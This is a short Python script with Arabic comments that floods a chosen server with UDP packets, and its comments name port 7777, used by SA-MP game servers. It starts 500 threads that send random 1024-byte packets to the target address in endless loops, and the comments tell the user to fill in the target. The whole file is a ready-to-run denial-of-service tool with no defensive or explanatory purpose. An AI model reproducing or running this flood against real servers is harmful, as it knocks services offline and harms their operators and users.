import socket
import threading
import random

target_ip = '127.0.0.1'  # حدد عنوان IP للسيرفر الهدف
target_port = 7777  # حدد المنفذ الهدف (عادةً ما يكون 7777 لـ SAMP)
num_threads = 500  # عدد الخيوط

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = random._urandom(1024)
        addr = (str(target_ip), int(target_port))
        s.sendto(data, addr)

for i in range(num_threads):
    thread = threading.Thread(target=attack)
    thread.start()
